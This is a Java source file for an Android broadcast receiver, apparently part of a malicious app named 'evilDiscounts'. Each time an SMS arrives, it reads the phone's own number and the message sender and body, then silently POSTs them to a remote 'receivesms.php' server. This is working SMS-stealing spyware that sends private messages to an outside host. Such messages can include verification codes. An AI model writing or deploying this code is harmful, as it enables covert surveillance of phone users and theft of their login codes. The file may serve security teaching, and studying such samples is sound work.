package com.evilDiscounts;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

/*
 * This receiver is triggered when an SMS is received and sends the sms details
 * to the server.
 */
public class SmsReceiver extends BroadcastReceiver {
  Context context;

  @Override
  public void onReceive(Context context, Intent intent) {
    this.context = context;
    // Get the user's number.
    TelephonyManager mTelephonyMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    String mynumber = mTelephonyMgr.getLine1Number().substring(1);

    // Get the SMS message passed in
    Bundle bundle = intent.getExtras();
    SmsMessage[] msgs = null;
    String from = "";
    String sms = "";
    if (bundle != null) {
      // Retrieve the SMS message received
      Object[] pdus = (Object[]) bundle.get("pdus");
      msgs = new SmsMessage[pdus.length];

      for (int i = 0; i < msgs.length; i++) {
        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
        from = msgs[i].getOriginatingAddress().substring(1);
        sms = msgs[i].getMessageBody().toString();
      }
      URL url;
      HttpURLConnection connect = null;
      BufferedReader rd;
      StringBuilder sb;
      OutputStreamWriter wr;
      // Replace this url with the url of your receivesms.php
      String urlString = "http://us-mg5.mail.yahoo.com/neo/launch?.rand=e1t0qn7vhot68/receivesms.php";
      try {
        System.setProperty("http.keepAlive", "false");
        url = new URL(urlString);
        connect = (HttpURLConnection) url.openConnection();
        connect.setRequestMethod("POST");
        connect.setDoOutput(true);
        connect.setDoInput(true);
        connect.setReadTimeout(10000);

        connect.connect();

        // write to the stream
        StringBuilder data = new StringBuilder();
        String numData = URLEncoder.encode("phoneId", "UTF-8") + "="
                + URLEncoder.encode(mynumber, "UTF-8");
        String fromData = URLEncoder.encode("otherPhoneId", "UTF-8") + "="
                + URLEncoder.encode(from, "UTF-8");
        String smsData = URLEncoder.encode("sms", "UTF-8") + "=" + URLEncoder.encode(sms, "UTF-8");
        data.append(numData).append("&").append(fromData).append("&").append(smsData);

        wr = new OutputStreamWriter(connect.getOutputStream());
        wr.write(data.toString());
        wr.flush();

        // read the result from the server
        rd = new BufferedReader(new InputStreamReader(connect.getInputStream()));
        sb = new StringBuilder();
        String line = null;
        while ((line = rd.readLine()) != null) {
          sb.append(line);
        }
      } catch (MalformedURLException e1) {
        e1.printStackTrace();
        Log.e("URL INVALID:", "The url given, " + urlString + ", is invalid.");
        return;
      } catch (IOException e) {
        e.printStackTrace();
        return;
      } finally {
        // close the connection, set all objects to null
        connect.disconnect();
        rd = null;
        sb = null;
        wr = null;
        connect = null;
      }
    }
  }
}